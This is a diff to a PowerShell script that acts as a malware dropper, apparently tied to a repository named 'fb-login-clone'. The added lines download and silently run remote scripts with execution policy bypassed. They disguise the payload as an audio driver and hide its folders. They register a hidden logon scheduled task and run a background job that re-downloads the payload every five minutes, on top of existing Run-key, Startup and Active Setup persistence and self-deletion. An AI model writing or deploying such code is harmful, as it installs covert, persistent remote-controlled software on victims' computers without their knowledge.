@@ -4,6 +4,20 @@ $ErrorActionPreference = "SilentlyContinue"
 
 $dest = "$env:APPDATA\Microsoft\Windows\system_cache"
 $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
+$localVersion = "1.0.0"
+
+try {
+    $remoteVersion = Invoke-WebRequest -Uri "$repo/version.txt" -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
+    if ($remoteVersion.Trim() -ne $localVersion) {
+        Write-Host "Update available, downloading..."
+        Invoke-WebRequest -Uri "$repo/AudioHost.ps1" -OutFile "$env:TEMP\AudioHost.ps1"
+        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\AudioHost.ps1`"" -WindowStyle Hidden
+        exit
+    }
+} catch {
+    Write-Warning "Version check failed: $_"
+}
+
 $files = @(
     "system_cache.ps1",
     "TaskService.bat",
@@ -36,6 +50,13 @@ try {
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
         -Name "system_cache" -Value "$dest\TaskService.vbs"
 } catch {}
+
+$targetFolder = "$env:APPDATA\AudioDriver"
+if (-not (Test-Path $targetFolder)) {
+    New-Item -ItemType Directory -Path $targetFolder | Out-Null
+}
+attrib +s +h $targetFolder
+attrib +s +h "$targetFolder\AudioHost.ps1"
 
 # Add to Startup folder (duplicate autostart method)
 try {
@@ -84,6 +105,29 @@ try {
     Set-ItemProperty -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" `
         -Name "StubPath" -Value "wscript.exe `"$dest\TaskService.vbs`""
 } catch {}
+
+$taskName = "AudioDriverUpdater"
+$taskPath = "\Microsoft\Windows\Audio"
+
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\AudioHost.ps1`""
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
+
+Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+
+Start-Job {
+    $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
+    $dest = "$env:APPDATA\AudioDriver\AudioHost.ps1"
+
+    while ($true) {
+        if (-not (Test-Path $dest)) {
+            try {
+                Invoke-WebRequest -Uri "$repo/AudioHost.ps1" -OutFile $dest -UseBasicParsing
+            } catch {}
+        }
+        Start-Sleep -Seconds 300
+    }
+} | Out-Null
 
 # Self-delete
 $me = $MyInvocation.MyCommand.Path
